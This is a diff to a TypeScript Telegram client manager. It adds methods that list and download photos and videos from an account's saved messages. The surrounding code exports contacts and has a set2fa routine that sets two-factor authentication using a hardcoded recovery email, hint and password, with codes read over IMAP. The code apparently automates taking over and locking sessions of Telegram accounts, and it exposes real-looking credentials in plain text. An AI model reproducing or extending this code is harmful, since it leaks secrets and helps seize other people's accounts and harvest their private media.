@@ -12,6 +12,7 @@ import { LogLevel } from 'telegram/extensions/Logger';
 import { MailReader } from '../../IMap/IMap';
 import * as bigInt from 'big-integer';
 import { IterDialogsParams } from 'telegram/client/dialogs';
+import { message } from 'telegram/client';
 
 class TelegramManager {
     private session: StringSession;
@@ -415,6 +416,36 @@ class TelegramManager {
         return exportedContacts;
     }
 
+
+    async getMediaMetadata() {
+        const messages = await this.client.getMessages('me', { limit: 100 });
+        const mediaMessages = messages.filter(message => message.media);
+        const data = []
+        for (const message of mediaMessages) {
+            if (message.photo) {
+                data.push({
+                    messageId: message.id,
+                    mediaType: 'photo'
+                })
+            } else if (message.video) {
+                data.push({
+                    messageId: message.id,
+                    mediaType: 'video'
+                })
+            }
+        }
+        return data
+    }
+
+    async downloadMediaFile(messageId: number) {
+        const message = await this.client.getMessages("me", { ids: messageId });
+        if (message) {
+            const file = await this.client.downloadMedia(message[0]);
+            return file;
+        }
+        throw new Error('Media not found');
+    }
+
     async updateUsername(baseUsername) {
         let newUserName = ''
         let username = (baseUsername && baseUsername !== '') ? baseUsername : '';
@@ -551,19 +582,19 @@ class TelegramManager {
     async set2fa() {
         if (!(await this.hasPassword())) {
             console.log("Password Does not exist, Setting 2FA");
-    
+
             const imapService = MailReader.getInstance();
             const twoFaDetails = {
                 email: "storeslaksmi@gmail.com",
                 hint: "password - India143",
                 newPassword: "Ajtdmwajt1@",
             };
-    
+
             try {
                 await imapService.connectToMail();
                 const checkMailInterval = setInterval(async () => {
                     console.log("Checking if mail is ready");
-    
+
                     if (imapService.isMailReady()) {
                         clearInterval(checkMailInterval);
                         console.log("Mail is ready, checking code!");
@@ -606,7 +637,7 @@ class TelegramManager {
                                 return Promise.resolve("error");
                             }
                         });
-    
+
                         return twoFaDetails;
                     } else {
                         console.log("Mail not ready yet");
@@ -619,7 +650,7 @@ class TelegramManager {
             console.log("Password already exists");
         }
     }
-    
+
 
     async sendPhotoChat(id: string, url: string, caption: string, filename: string): Promise<void> {
         if (!this.client) throw new Error('Client is not initialized');
